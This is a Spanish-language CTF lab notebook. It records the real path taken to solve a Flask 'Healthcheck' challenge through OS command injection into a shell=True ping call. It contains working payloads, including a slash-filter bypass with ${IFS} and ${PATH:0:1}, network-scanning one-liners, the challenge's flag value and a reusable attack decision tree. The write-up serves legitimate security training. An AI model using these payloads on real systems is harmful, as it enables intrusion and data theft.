# Solución — Healthcheck (OS Command Injection)

> Registro de resolución del CTF. Documenta la traza **real** que seguimos (incluyendo las
> ramas que abandonamos) y el árbol de decisión. No es el writeup pulido — es el cuaderno de
> laboratorio.

| Campo | Valor |
|-------|-------|
| Categoría | Web Hacking |
| Concepto | OS Command Injection (`subprocess` con `shell=True`) |
| Enunciado | *Exploit a vulnerability in the image upload functionality to obtain the server's flag.* |
| Flag | `flag_3c462f978e95e26eb2a50235903f82e4a09c5ab95decfac4aec8c58e8fef7915` |

## Infraestructura

| Rol | IP:puerto | Software |
|-----|-----------|----------|
| `p1` — app objetivo | `192.168.200.100:3000` | Flask (Werkzeug 3.1.3 / Python 3.13) |
| `fileserver` | `192.168.200.200:80` | `python -m http.server` (SimpleHTTP 0.6) |
| Máquina de trabajo | `192.168.200.51` | Debian 12 (bookworm) — el usuario `python` es del objetivo, no del workstation |

---

## Árbol de pasos — traza real de este solve

```mermaid
flowchart TD
    Z[Ping sweep de la /24<br/>desde workstation .51] --> A0[Hosts vivos → hosts.txt:<br/>.2 · .51 · .100 · .200]
    A0 --> A0b[Escaneo de puertos de hosts.txt<br/>.100:3000 · .200:80 · .2:53 · .51:22,80]
    A0b --> A[Recon: fingerprint de .100:3000 y .200:80]
    A --> B[p1 = Werkzeug/Flask :3000<br/>fileserver = SimpleHTTP :80 con listado]
    B --> C[Encontrar formulario:<br/>/send?url= — Healthcheck]
    C --> D{Hipótesis: ¿SSRF?<br/>el campo pide una URL}

    D -->|test: url=http://fileserver/| E[Output = salida de PING]
    E --> F[✖ NO es SSRF<br/>no descargó una página, ejecutó ping]
    F --> G[PIVOT: es un wrapper de ping<br/>→ OS Command Injection]

    D -.rama abandonada.-> D1[test: url=file:///etc/passwd]
    D1 --> D2[Respuesta: Invalid<br/>→ hay filtro por esquema]

    G --> H[Source disclosure:<br/>fileserver expone app.py]
    H --> I[Auditar app.py]
    I --> J[Bug 1: validación solo en rama https://<br/>Bug 2: http:// devuelve host sin validar<br/>Bug 3: shell=True + f-string<br/>Límite: host = &#91;^/&#93;+ → sin '/']

    J --> K[Payload RCE:<br/>http://;id;pwd;ls;]
    K --> L[uid=python · cwd=/app · existe archivo 'flag']
    L --> M[Payload lectura:<br/>http://;cat%20flag;]
    M --> N([FLAG])

    style F fill:#5b1a1a,color:#fff
    style D2 fill:#5b1a1a,color:#fff
    style G fill:#1a3d5b,color:#fff
    style N fill:#1a5b2a,color:#fff
```



---

## Traza cronológica detallada

### 0. Descubrimiento de red

Partimos solo con la IP del workstation (`192.168.200.51`).

**a) Hosts vivos** — ping sweep, guardado a `hosts.txt` para encadenar el siguiente paso:

```bash
seq 1 254 | xargs -P64 -I{} sh -c 'ping -c1 -W1 192.168.200.{} >/dev/null 2>&1 && echo 192.168.200.{}' | sort -t. -k4 -n > hosts.txt
cat hosts.txt
```
```
192.168.200.2      # gateway/router
192.168.200.51     # workstation (self)
192.168.200.100    # candidato -> resultará ser p1 (app)
192.168.200.200    # candidato -> resultará ser fileserver
```

**b) Puertos abiertos** — escaneo leyendo `hosts.txt` con `/dev/tcp` de bash:

```bash
while read -r h; do
  seq 1 10000 | xargs -P200 -I{} bash -c "timeout 1 bash -c 'echo >/dev/tcp/$h/{}' 2>/dev/null && echo $h:{}"
done < hosts.txt | sort -t: -k1,1 -k2,2n
```
```
192.168.200.2:53       # DNS del router
192.168.200.51:22      # self (SSH)
192.168.200.51:80      # self (web local)
192.168.200.100:3000   # OBJETIVO — web en puerto no estándar
192.168.200.200:80     # fileserver
```

> **Notas de errores durante el solve:**
> - Ping sweep, primer intento: `for i in ...; do (ping ...) & done; wait | sort`. El `&` en
>   shell interactiva genera avisos de job control (`[N] PID`, `Exit 1`) que ensucian la
>   salida, y `wait | sort` no captura los `echo` de los subshells. Se reemplazó por `xargs -P64`.
> - Escaneo de puertos, primer intento: `for h in 100 200; do ... "..." \done | sort`. El
>   `\done` (con `\`) y sin `;` dejó el `for` sin cerrar → prompt `>` colgado. Fix: `; done`.
>   Además se cambió a `while read -r h ... done < hosts.txt` para no re-hardcodear las IPs.

### 1. Reconocimiento — fingerprint

**Objetivo `p1`:**

```bash
curl -sI http://192.168.200.100:3000/
```
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.13.3
Content-Type: text/html; charset=utf-8
```
→ **Decisión:** es Flask (Werkzeug), no Node. Puerto 3000 engañó (default de Express). Se
descartan webshells `.php`; entran al radar SSTI, debugger de Werkzeug, command injection.

**Fileserver:**
```bash
curl -sI http://192.168.200.200/
curl -s  http://192.168.200.200/ | head -40
```
```
Server: SimpleHTTP/0.6 Python/3.11.10
...
<title>Directory listing for /</title>
<li><a href="1/">1</a></li>
```
→ **Decisión:** listado de directorios abierto. Se guarda como posible fuente de código.

### 2. Reconocimiento — el formulario

```bash
curl -s http://192.168.200.100:3000/ | grep -iE '<form|action=|<input|name=|<button'
```
```html
<form action="/send" method="GET">
  <h2>SEND HEALTHCHECK</h2>
  <input type="text" name="url" placeholder="ex) https://www.google.com">
  <button type="submit">Send</button>
</form>
```
→ Campo `url`, GET, ruta `/send`, app "Healthcheck".

> **Nota de errores de tipeo durante el solve:** las primeras corridas fallaron por apuntar a
> `192.168.200.200:3000` (host equivocado) y a `168.200.100` (faltó `192.`). Se corrigió
> usando variables `T=http://192.168.200.100:3000` y `F=http://192.168.200.200`.

### 3. Hipótesis SSRF → prueba → PIVOT

**Hipótesis:** el campo pide una URL → SSRF (igual que *My WebView*).

```bash
curl -s "http://192.168.200.100:3000/send?url=http://192.168.200.200/"
```
```
Execution Result
PING 192.168.200.200 (192.168.200.200) 56(84) bytes of data.
64 bytes from 192.168.200.200: icmp_seq=1 ttl=64 time=3.94 ms
--- 192.168.200.200 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```
→ **PIVOT:** no descargó la página, ejecutó `ping`. **No es SSRF — es command injection.**

**Ramas de confirmación:**
```bash
curl -s "http://192.168.200.100:3000/send?url=file:///etc/passwd"     # -> Invalid
curl -s "http://192.168.200.100:3000/send?url=http://127.0.0.1:3000/" # -> ping: 127.0.0.1:3000: Name or service not known
```
- `file://` → `Invalid`: **rama abandonada** (hay filtro por esquema).
- `127.0.0.1:3000` se pasó tal cual a `ping`: confirma que el host se inyecta en un comando.

**Nota — enumeración de rutas (todas dieron 500):**
```bash
for p in upload uploads image images file files healthcheck health check console static; do
  echo -n "/$p -> "; curl -s -o /dev/null -w "%{http_code}\n" "http://192.168.200.100:3000/$p"
done
# todas -> 500 (errorhandler global en Flask; no hay rutas de upload separadas)
```

### 4. Source disclosure — de caja negra a caja blanca

Navegando el listado del fileserver: `/1/` → `/1/eng/` → `/1/eng/for_user/` → `app.py`.

```bash
curl -s http://192.168.200.200/1/eng/for_user/app.py
```

Fragmentos clave:
```python
def is_safe_input(host):
    safe_pattern = re.compile(r'^[a-zA-Z0-9_\-\.]+$')
    return safe_pattern.match(host) is not None

def check_url(url):
    regex = re.compile(r'^(https?://)([^/]+)')
    match = regex.match(url)
    if match:
        protocol = match.group(1)
        host = match.group(2)
        if protocol == 'https://':
            if is_safe_input(host):
                return host
            else:
                return "Invalid"
        return host                      # <-- http:// SIN validar
    else:
        return "Invalid"

def healthcheck(host):
    command = f"ping {host} -c 1"
    process = subprocess.Popen(command, shell=True, ...)   # <-- RCE

# app.run(host='0.0.0.0', port=3000, debug=False)
```

**Análisis del bug:**
1. La validación (`is_safe_input`, allowlist estricta) está DENTRO del `if protocol == 'https://'`.
2. Con `http://`, `check_url` devuelve el host **sin validar**.
3. `healthcheck` interpola el host en `ping {host} -c 1` y lo corre con `shell=True`.
4. Única restricción: el host es `[^/]+` → **no puede contener `/`**.

`debug=False` → se descarta la consola RCE de Werkzeug. El vector es la interpolación.

### 5. Explotación — confirmar RCE

Payload: protocolo `http://` (esquiva el filtro) + `;` para encadenar + sin `/`. Espacio = `%20`.

```bash
T=http://192.168.200.100:3000
show(){ curl -s "$T/send?url=$1" | sed -n '/class="result"/,/<\/div>/p' | sed 's/<[^>]*>//g'; }

show 'http://%3Bid%3Bpwd%3Bls%3B'      # ping ;id;pwd;ls; -c 1
```
```
uid=1000(python) gid=1000(python) groups=1000(python)
/app
app.py
flag
requirements.txt
templates
ping: usage error: Destination address required
/bin/sh: 1: -c: not found
```
→ RCE como `python`, cwd `/app`, existe archivo `flag`.

### 6. Explotación — leer el flag

`flag` está en el cwd → nombre relativo, sin `/`. Solo hay que codificar el espacio de `cat flag`.

```bash
show 'http://%3Bcat%20flag%3B'          # ping ;cat flag; -c 1
```
```
flag_3c462f978e95e26eb2a50235903f82e4a09c5ab95decfac4aec8c58e8fef7915
```

---

## Payloads finales (resumen copiable)

```bash
T=http://192.168.200.100:3000
show(){ curl -s "$T/send?url=$1" | sed -n '/class="result"/,/<\/div>/p' | sed 's/<[^>]*>//g'; }

# 1. leer código fuente (opcional, desde el fileserver)
curl -s http://192.168.200.200/1/eng/for_user/app.py

# 2. RCE / enumeración
show 'http://%3Bid%3Bpwd%3Bls%3B'

# 3. leer el flag
show 'http://%3Bcat%20flag%3B'
```

Si el flag estuviera en ruta absoluta (`/root/flag`), sortear el bloqueo de `/`:
```bash
show 'http://%3Bcat%24%7BIFS%7D%24%7BPATH%3A0%3A1%7Droot%24%7BPATH%3A0%3A1%7Dflag%3B'
#            cat ${IFS} ${PATH:0:1}root${PATH:0:1}flag
```

---

## Árbol de decisión genérico (reutilizable)

Plantilla para futuros ejercicios "campo que acepta una URL / host":

```mermaid
flowchart TD
    A[Campo acepta URL o host] --> B[Fingerprint del stack<br/>curl -sI]
    B --> C[Enviar un valor de prueba<br/>y OBSERVAR el output]

    C --> D{¿Qué devuelve el output?}
    D -->|contenido de una web remota| SSRF[SSRF<br/>→ probar file://, localhost,<br/>metadata, puertos internos]
    D -->|salida de ping / nslookup / dns| CMD["OS Command Injection<br/>→ inyectar ; &#124; && &#96;$()&#96;"]
    D -->|render de plantilla / cálculo| SSTI[SSTI<br/>→ probar &#123;&#123;7*7&#125;&#125;]
    D -->|imagen procesada / redimensionada| IMG[Parser de imágenes<br/>→ ImageMagick, SVG/XXE]
    D -->|error / Invalid| FILT[Hay un filtro<br/>→ mapear qué bloquea]

    FILT --> WB{¿Hay código fuente accesible?<br/>listado de dirs, .git, backups}
    SSRF --> WB
    CMD --> WB
    WB -->|sí| WHITE[Caja blanca:<br/>leer la fuente,<br/>encontrar el bypass exacto]
    WB -->|no| BLACK[Caja negra:<br/>fuzzing de metacaracteres<br/>y esquemas]

    WHITE --> EXP[Diseñar payload respetando<br/>las restricciones residuales]
    BLACK --> EXP
    EXP --> FLAG([Ejecutar → flag])

    style CMD fill:#1a3d5b,color:#fff
    style WHITE fill:#3d3d1a,color:#fff
    style FLAG fill:#1a5b2a,color:#fff
```



**Reglas heurísticas destiladas de este solve:**

1. **El comportamiento manda sobre el nombre.** Un campo `url` no implica SSRF; el output
   de `ping` reveló command injection. Enviar un valor y leer la respuesta > asumir.
2. **Un filtro que rechaza (`Invalid`, error) es información**, no un muro. Dice qué esquema
   o carácter bloquea → indica por dónde NO y, por descarte, por dónde sí.
3. **Buscar la fuente siempre.** Listado de directorios, `.git/`, `app.py.bak`, comentarios
   HTML. Pasar a caja blanca convierte adivinar en calcular.
4. **Mapear las restricciones residuales antes de disparar.** Aquí: `http://` obligatorio +
   sin `/`. El payload se diseña alrededor de esos límites (`;`, `%20`, `${IFS}`, `${PATH:0:1}`).
